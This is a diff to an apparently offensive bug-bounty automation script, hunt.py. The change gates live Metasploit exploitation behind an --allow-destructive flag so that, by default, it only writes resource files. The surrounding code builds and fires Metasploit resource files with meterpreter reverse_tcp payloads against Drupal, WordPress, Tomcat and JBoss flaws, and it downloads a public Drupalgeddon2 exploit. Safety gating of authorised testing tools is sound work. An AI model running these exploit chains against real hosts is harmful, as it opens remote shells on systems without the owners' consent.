@@ -9,7 +9,7 @@ Chains: recon → tech-CVE → JS analysis → secret hunt → param discovery �
 Usage:
     python3 hunt.py --target example.com          Focused high-yield pipeline (SQLi/RCE/CMS/CVEs)
     python3 hunt.py --target x --quick            Quick focused scan
-    python3 hunt.py --target x --full             Everything (all phases)
+    python3 hunt.py --target x --full             Everything (all phases; MSF exploits are WRITTEN as .rc, not fired — add --allow-destructive to stage live meterpreter)
     python3 hunt.py --target x --autonomous       Bounded autonomous hunt
     python3 hunt.py --target x --recon-only       Recon only
     python3 hunt.py --target x --scan-only        Vuln scan only
@@ -3729,6 +3729,7 @@ def _run_autonomous_step(
     skip_items: set[str],
     result: dict,
     completed: set[str],
+    allow_destructive: bool = False,
 ) -> bool:
     """Execute one autonomous step in the chosen priority order."""
     del batch_size  # reserved for future step-specific tuning
@@ -3752,10 +3753,10 @@ def _run_autonomous_step(
         ok = run_cors_check(domain)
         result["cors"] = ok
     elif step == "cms_exploit":
-        ok = run_cms_exploit(domain)
+        ok = run_cms_exploit(domain, allow_destructive=allow_destructive)
         result["cms_exploit"] = ok
     elif step == "rce_scan":
-        ok = run_rce_scan(domain)
+        ok = run_rce_scan(domain, allow_destructive=allow_destructive)
         result["rce_scan"] = ok
     elif step == "sqlmap":
         ok = run_sqlmap_targeted(domain)
@@ -3962,6 +3963,7 @@ def run_autonomous_hunt(
                 skip_items=skip_items,
                 result=result,
                 completed=completed,
+                allow_destructive=allow_destructive,
             )
         except Exception as exc:  # noqa: BLE001 — one tool crash must not abort the plan/report
             log("err", f"Autonomous step '{step}' raised and was skipped: {exc}")
@@ -5323,43 +5325,61 @@ def _get_lhost() -> str:
         return "127.0.0.1"
 
 
-def run_msf(rc_path: str, label: str = "", timeout: int = 360) -> bool:
+def _msf_live_allowed(allow_destructive: bool) -> tuple[bool, str]:
+    """Single decision site: may run_msf fire a LIVE exploit?
+
+    Fail-closed. Live msfconsole/meterpreter reverse_tcp staging runs ONLY when the
+    operator passed --allow-destructive AND has not forced MSF_DRYRUN. Absent the
+    flag we only ever write the .rc artifact — no reverse shell is staged. This
+    inverts the old env-only gate (MSF_DRYRUN was fail-OPEN: unset => live)."""
+    if not allow_destructive:
+        return (False, "live exploit gated behind --allow-destructive")
+    if os.environ.get("MSF_DRYRUN", "").strip().lower() in ("1", "true", "yes"):
+        return (False, "MSF_DRYRUN override set — dry-run despite --allow-destructive")
+    return (True, "")
+
+
+def run_msf(rc_path: str, label: str = "", timeout: int = 360,
+            allow_destructive: bool = False) -> bool:
     """
     Execute a Metasploit resource file non-interactively.
       • Auto-detects and patches LHOST into the .rc file
       • Spools msfconsole output to <rc_path>_output.txt
       • Detects: session opened / meterpreter / shell
       • Returns True if a session was obtained
+
+    FAIL-CLOSED: a live `exploit` fires only when ``allow_destructive`` is True
+    (from --allow-destructive). Otherwise this writes the inspect-ready _auto.rc
+    and returns False — no meterpreter session is ever staged silently.
     """
     msf_bin = shutil.which("msfconsole")
     if not msf_bin:
         log("warn", "msfconsole not installed — skipping auto-exploit")
         return False
 
-    # audit-fix: confirmed-RCE branches auto-launch a live `exploit` (meterpreter
-    # reverse_tcp staging) behind only the --rce-scan/--exploit phase flag. Honor
-    # MSF_DRYRUN=1 so an operator can generate/inspect the .rc files without
-    # firing the live exploit. Applies to all run_msf call sites (Tomcat, JBoss,
-    # Drupal, WordPress).
-    if os.environ.get("MSF_DRYRUN", "").strip().lower() in ("1", "true", "yes"):
-        log("warn", f"MSF_DRYRUN set — wrote .rc for '{label or 'msf'}' but NOT "
-                    f"running exploit (meterpreter staging skipped)")
-        return False
-
     lhost   = _get_lhost()
     auto_rc = rc_path.replace(".rc", "_auto.rc")
     log_path = rc_path.replace(".rc", "_output.txt")
 
+    # Always write the inspect-ready _auto.rc first (LHOST patched, spool + clean
+    # exit) so even a fail-closed dry-run leaves an artifact the operator can run.
     try:
         with open(rc_path) as fh:
             rc_content = fh.read()
         rc_content = rc_content.replace("YOUR_IP", lhost)
-        # Prepend spool + append clean exit so msfconsole doesn't hang
         rc_content = f"spool {log_path}\n" + rc_content + "\nexit -y\n"
         with open(auto_rc, "w") as fh:
             fh.write(rc_content)
     except Exception as e:
         log("err", f"Failed to patch .rc file: {e}")
+        return False
+
+    # FAIL-CLOSED destructive gate (single decision site). MSF_DRYRUN remains a
+    # belt-and-suspenders override, NOT the primary gate.
+    _live, _why = _msf_live_allowed(allow_destructive)
+    if not _live:
+        log("warn", f"DRY-RUN [{label or 'msf'}]: {_why}. Wrote {os.path.basename(auto_rc)} "
+                    f"for manual review — no meterpreter session staged.")
         return False
 
     lbl = f" [{label}]" if label else ""
@@ -5406,7 +5426,7 @@ def run_msf(rc_path: str, label: str = "", timeout: int = 360) -> bool:
 
 
 # ── NEW: CMS Exploit (Drupal/WordPress) ────────────────────────────────────────
-def run_cms_exploit(domain: str) -> bool:
+def run_cms_exploit(domain: str, allow_destructive: bool = False) -> bool:
     """
     CMS detection + exploitation PoC:
     1. whatweb fingerprinting on live hosts
@@ -5707,7 +5727,7 @@ set PAYLOAD php/meterpreter/reverse_tcp
 check
 """)
                 log("ok", f"MSF .rc (CVE-2018-7600) → {rc2}")
-                run_msf(rc2, label="CVE-2018-7600 Drupalgeddon2")
+                run_msf(rc2, label="CVE-2018-7600 Drupalgeddon2", allow_destructive=allow_destructive)
 
                 log("info", "Skipping Metasploit Drupalgeddon3 resource generation — no stock module is installed for CVE-2018-7602")
 
@@ -5725,7 +5745,7 @@ set PAYLOAD php/meterpreter/reverse_tcp
 check
 """)
                 log("ok", f"MSF .rc (CVE-2014-3704) → {rc1}")
-                run_msf(rc1, label="CVE-2014-3704 Drupalgeddon1 SQLi")
+                run_msf(rc1, label="CVE-2014-3704 Drupalgeddon1 SQLi", allow_destructive=allow_destructive)
         else:
             log("warn", f"drupalgeddon2.py not found at {drupal_poc}")
             log("info", f'Install: mkdir -p "{REPO_TOOLS_DIR}" && curl -sL https://raw.githubusercontent.com/pimps/CVE-2018-7600/master/drupa7-CVE-2018-7600.py -o "{REPO_TOOLS_DIR}/drupalgeddon2.py"')
@@ -5869,7 +5889,7 @@ show options
 exploit
 """)
             log("ok", f"WordPress Metasploit .rc → {rc_path}")
-            run_msf(rc_path, label="WP admin shell upload")
+            run_msf(rc_path, label="WP admin shell upload", allow_destructive=allow_destructive)
 
     if not drupal_hosts and not wp_hosts:
         log("info", "No Drupal or WordPress hosts detected")
@@ -5884,7 +5904,7 @@ exploit
 
 
 # ── RCE Scan: Log4Shell + Tomcat CVE-2017-12615 + JBoss ─────────────────────────
-def run_rce_scan(domain: str) -> bool:
+def run_rce_scan(domain: str, allow_destructive: bool = False) -> bool:
     """
     Targeted RCE detection for Java/Tomcat/JBoss targets found during recon:
 
@@ -6251,7 +6271,7 @@ set LPORT 4447
 set PAYLOAD java/meterpreter/reverse_tcp
 exploit
 """)
-                run_msf(rc_tomcat, label="CVE-2017-12615 Tomcat PUT")
+                run_msf(rc_tomcat, label="CVE-2017-12615 Tomcat PUT", allow_destructive=allow_destructive)
             # Clean up uploaded file
             run_cmd_args(["curl", "-sk", "-m", "5", "-X", "DELETE", f"{target_url}/{test_jsp}"], timeout=5)
         elif status == "403":
@@ -6337,7 +6357,7 @@ set LPORT 4448
 set PAYLOAD java/meterpreter/reverse_tcp
 exploit
 """)
-                    run_msf(rc_jboss, label="JBoss MainDeployer")
+                    run_msf(rc_jboss, label="JBoss MainDeployer", allow_destructive=allow_destructive)
                 elif status == "200" and any(term in body.lower() for term in jboss_block_terms):
                     jboss_results.append(f"  → BLOCKED/WAF: {body[:80]}")
                 elif status == "200":
@@ -9180,6 +9200,7 @@ def hunt_target(
     browser_headed: bool = False,
     browser_model: str | None = None,
     browser_unsafe: bool = False,
+    allow_destructive: bool = False,
 ) -> dict:
     skip_items = skip_items or set()
     result = {
@@ -9446,11 +9467,11 @@ def hunt_target(
 
     # ── Phase 8: CMS Exploit (Drupal / WordPress) ──────────────────────────
     if cms_exploit and not skip_has(skip_items, "cms_exploit"):
-        result["cms_exploit"] = run_cms_exploit(domain)
+        result["cms_exploit"] = run_cms_exploit(domain, allow_destructive=allow_destructive)
 
     # ── Phase 8.5: RCE Scan (Log4Shell + Tomcat PUT + JBoss) ───────────────
     if rce_scan and not skip_has(skip_items, "rce_scan"):
-        result["rce_scan"] = run_rce_scan(domain)
+        result["rce_scan"] = run_rce_scan(domain, allow_destructive=allow_destructive)
 
     # ── Phase 8.7: Email Authentication Audit (v7.2.0) ─────────────────────
     # Runs alongside web scans — SPF/DMARC/DKIM/MTA-STS/BIMI/DNSSEC posture.
@@ -9814,7 +9835,8 @@ def main() -> None:
         epilog="""
 Examples:
   python3 hunt.py --target example.com              Focused high-yield pipeline (SQLi/RCE/CMS/CVEs)
-  python3 hunt.py --target example.com --full       All phases (JS, secrets, API, CORS, etc.)
+  python3 hunt.py --target example.com --full       All phases (JS, secrets, API, CORS, etc.; MSF exploits WRITTEN not fired — see --allow-destructive)
+  python3 hunt.py --target example.com --full --allow-destructive   Stage LIVE meterpreter on confirmed-vuln hosts
   python3 hunt.py --target example.com --autonomous Bounded autonomous hunt
   python3 hunt.py --target example.com --resume     Resume the latest recon session
   python3 hunt.py --target example.com --resume 20260322_101530_abcd
@@ -9849,7 +9871,10 @@ Examples:
     parser.add_argument("--autonomous",       action="store_true",
                         help="Bounded autonomous mode: infer the next best phases from recon evidence and checkpoint progress")
     parser.add_argument("--allow-destructive", action="store_true",
-                        help="Allow autonomous mode to run noisier phases like CMS exploit checks, RCE probes, sqlmap, and zero-day fuzzing")
+                        help="Authorize LIVE msfconsole exploitation — stages meterpreter reverse_tcp "
+                             "shells on confirmed-vulnerable Drupal/WordPress/Tomcat/JBoss hosts. Applies "
+                             "to --full and default runs too, NOT only autonomous. Without it, exploit "
+                             "phases only WRITE .rc resource files for review (no reverse shell is staged).")
     parser.add_argument("--max-steps",        type=int, default=DEFAULT_AUTONOMOUS_STEPS,
                         help=f"Maximum autonomous phases to schedule after recon (default: {DEFAULT_AUTONOMOUS_STEPS})")
     parser.add_argument("--recon-only",       action="store_true")
@@ -10303,6 +10328,7 @@ Examples:
                 browser_headed=args.browser_headed,
                 browser_model=args.browser_model,
                 browser_unsafe=args.browser_unsafe,
+                allow_destructive=args.allow_destructive,
             )
         print_dashboard([result])
         return
@@ -10336,6 +10362,7 @@ Examples:
             browser_headed=args.browser_headed if hasattr(args, "browser_headed") else False,
             browser_model=args.browser_model if hasattr(args, "browser_model") else None,
             browser_unsafe=args.browser_unsafe if hasattr(args, "browser_unsafe") else False,
+            allow_destructive=args.allow_destructive if hasattr(args, "allow_destructive") else False,
         )
         results.append(result)
 
